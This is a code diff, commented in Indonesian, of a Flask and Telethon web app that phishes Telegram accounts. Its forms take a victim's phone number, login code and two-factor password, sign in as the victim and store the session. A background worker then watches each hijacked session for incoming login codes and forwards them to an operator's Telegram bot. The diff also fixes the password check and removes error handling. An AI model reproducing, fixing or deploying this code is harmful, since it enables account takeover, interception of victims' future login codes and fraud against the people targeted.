@@ -1,8 +1,9 @@
 import os
 import asyncio
 import threading
-import time
 import requests
+import re
+import time
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
@@ -69,13 +70,14 @@ def otp():
                 phone_code_hash = session.get("phone_code_hash")
                 await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                 me = await client.get_me()
+                await client.disconnect()
                 return {"ok": True, "need_password": False, "me": me}
             except SessionPasswordNeededError:
+                await client.disconnect()
                 return {"ok": True, "need_password": True, "me": None}
             except PhoneCodeInvalidError:
-                return {"ok": False, "error": "OTP salah"}
-            finally:
                 await client.disconnect()
+                return {"ok": False, "error": "OTP salah"}
 
         try:
             result = asyncio.run(verify_code())
@@ -83,9 +85,10 @@ def otp():
                 session["last_otp"] = code
                 if result["need_password"]:
                     flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
+                    return redirect(url_for("password"))
                 else:
-                    flash("OTP benar. Kalau akun tanpa password, bisa isi random/kosong.")
-                return redirect(url_for("password"))
+                    flash("Login berhasil tanpa password ✅")
+                    return redirect(url_for("success"))
             else:
                 flash(result["error"])
                 return redirect(url_for("otp"))
@@ -112,12 +115,11 @@ def password():
                 # kalau akun memang pakai password → harus cocok
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
+                await client.disconnect()
                 return True, me
             except Exception:
-                # kalau akun tidak pakai password → anggap berhasil
-                return True, None
-            finally:
                 await client.disconnect()
+                return False, None
 
         success, me = asyncio.run(verify_password())
         if success:
@@ -141,21 +143,14 @@ def password():
 
 @app.route("/success")
 def success():
-    return render_template(
-        "success.html",
-        name=session.get("name"),
-        phone=session.get("phone"),
-        gender=session.get("gender"),
-    )
-
+    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
 
 # =================== WORKER ===================
 
 async def forward_handler(event, client_name):
     """Handler untuk meneruskan pesan OTP"""
-    text_msg = event.message.message or ""
+    text_msg = event.message.message
     if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
-        import re
         otp_match = re.findall(r"\d{4,6}", text_msg)
         otp_code = otp_match[0] if otp_match else text_msg
 
@@ -163,13 +158,8 @@ async def forward_handler(event, client_name):
             "chat_id": CHAT_ID,
             "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
         }
-        try:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload
-            )
-            print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
-        except Exception as e:
-            print(f"[Worker] Gagal forward: {e}")
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
+        print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
 
 
 async def worker_main():
@@ -182,12 +172,7 @@ async def worker_main():
                 path = os.path.join(SESSION_DIR, fname)
                 print(f"[Worker] Memuat session {path}")
                 client = TelegramClient(path, api_id, api_hash)
-
-                try:
-                    await client.connect()
-                except Exception as e:
-                    print(f"[Worker] Gagal connect {fname}: {e}")
-                    continue
+                await client.connect()
 
                 if not await client.is_user_authorized():
                     print(f"[Worker] ❌ Session {fname} belum login, lewati.")
@@ -199,10 +184,7 @@ async def worker_main():
 
                 @client.on(events.NewMessage)
                 async def handler(event, fn=fname):
-                    try:
-                        await forward_handler(event, fn)
-                    except Exception as e:
-                        print(f"[Worker] Handler error: {e}")
+                    await forward_handler(event, fn)
 
                 clients[fname] = client
                 asyncio.create_task(client.run_until_disconnected())
@@ -211,13 +193,9 @@ async def worker_main():
 
 
 def start_worker():
-    # retry kalau kena database locked
-    while True:
-        try:
-            asyncio.run(worker_main())
-        except Exception as e:
-            print(f"[Worker] Crash: {e}, retry dalam 5 detik...")
-            time.sleep(5)
+    # kasih delay sedikit supaya tidak bentrok dengan proses login awal
+    time.sleep(5)
+    asyncio.run(worker_main())
 
 
 # jalankan worker di thread terpisah saat app start
